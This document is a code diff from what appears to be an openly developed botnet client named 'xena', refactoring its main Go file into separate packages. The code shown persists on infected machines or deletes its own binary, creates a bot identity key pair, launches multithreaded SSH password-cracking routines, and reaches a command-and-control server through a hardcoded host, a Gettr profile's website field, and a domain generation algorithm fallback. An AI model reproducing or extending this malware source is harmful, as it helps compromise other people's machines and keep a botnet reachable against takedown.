@@ -6,6 +6,10 @@ import (
 	"math/rand"
 	"net"
 	"time"
+	"xena/helpers"
+	"xena/modules"
+	"xena/repository"
+	"xena/services"
 
 	"github.com/google/uuid"
 )
@@ -18,7 +22,7 @@ var publicIdentificationKey *rsa.PublicKey
 var id string
 
 // Last time since the contact was made with bot herder.
-var lastContactMade int = timeSinceJesus()
+var lastContactMade int = helpers.TimeSinceJesus()
 
 // Does Atila (cnc) knows about us?
 var identified bool = false
@@ -69,26 +73,26 @@ func initialize() {
 	// Check if the bot is persistent within the environment, if not then persist.
 	// But only if we're not set to remove the binary up on execution.
 	if !removeSelf {
-		if !checkIfPersisted() {
-			err := persist()
+		if !modules.CheckIfPersisted() {
+			err := modules.Persist()
 			fmt.Println(err)
 		}
 	} else {
-		err := removeBinary()
+		err := modules.RemoveBinary()
 		if err != nil {
 			fmt.Println(err)
 		}
 	}
 
 	// Initialize a SQLite database and run the migrations.
-	err := dbInit()
+	err := repository.Init(modules.SelfHash)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
 	// Check the database for details about self.
-	botDetails, err := dbGetBotDetails()
+	botDetails, err := repository.GetBotDetails()
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -97,27 +101,27 @@ func initialize() {
 	// Check if we ever saved details about ourselves.
 	if len(botDetails.Id) == 0 && len(botDetails.PublicKey) == 0 && len(botDetails.PrivateKey) == 0 {
 		// Key-pair used for signing and verifying messages.
-		privateIdentificationKey = generatePrivateKey()
+		privateIdentificationKey = modules.GeneratePrivateKey()
 		publicIdentificationKey = &privateIdentificationKey.PublicKey
 		// Generate the unique bot identifier.
 		id = uuid.New().String()
 
 		// Save into the database.
-		dbInsertBotDetails(id, privateKeyToPEM(privateIdentificationKey), publicKeyToPEM(publicIdentificationKey))
+		repository.InsertBotDetails(id, modules.PrivateKeyToPEM(privateIdentificationKey), modules.PublicKeyToPEM(publicIdentificationKey))
 	} else {
 		// Load into global variables bot's details.
-		privateIdentificationKey, err = importPEMPrivateKey(botDetails.PrivateKey)
+		privateIdentificationKey, err = modules.ImportPEMPrivateKey(botDetails.PrivateKey)
 		if err != nil {
 			panic(err)
 		}
-		publicIdentificationKey = importPEMPublicKey(botDetails.PublicKey)
+		publicIdentificationKey = modules.ImportPEMPublicKey(botDetails.PublicKey)
 		id = botDetails.Id
 	}
 
 	// Ignite the SSH cracker.
 	if enableSshCracker {
 		for i := 0; i < sshThreads; i++ {
-			go sshCrackRoutine()
+			go modules.SshCrackRoutine(gatewayHost)
 		}
 	}
 }
@@ -132,12 +136,12 @@ func prepare() {
 	}
 
 	// Calculate hash of itself, so that later we can delete the binary if needed.
-	hash, err := hashSelf()
+	hash, err := modules.HashSelf()
 	if err != nil {
 		fmt.Println(err)
 		panic(err)
 	}
-	selfHash = hash
+	modules.SelfHash = hash
 }
 
 func main() {
@@ -154,24 +158,24 @@ func main() {
 		// We need to reach out to hardcoded host of Atila. (cnc)
 		if tick(gatewayHost) {
 			// Reset the timer of DGA and move on...
-			lastContactMade = timeSinceJesus()
+			lastContactMade = helpers.TimeSinceJesus()
 			continue
 		}
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
-		gettrGatewayHost, err := gettrProfileWebsite(gettrProfileName)
+		gettrGatewayHost, err := services.GettrProfileWebsite(gettrProfileName)
 		if err == nil && len(gettrGatewayHost) != 0 {
 			if tick(gettrGatewayHost) {
 				// Reset the timer of DGA and move on...
-				lastContactMade = timeSinceJesus()
+				lastContactMade = helpers.TimeSinceJesus()
 				continue
 			}
 		}
 
 		// Check if DGA should kick it.
-		if timeSinceJesus()-lastContactMade > dgaAfterDays {
+		if helpers.TimeSinceJesus()-lastContactMade > dgaAfterDays {
 			// Try to find the Atila (cnc) behind a generated domain.
-			for _, host := range dga(dgaSeed) {
+			for _, host := range helpers.Dga(dgaSeed) {
 				if _, err := net.LookupIP(host); err != nil {
 					continue
 				}
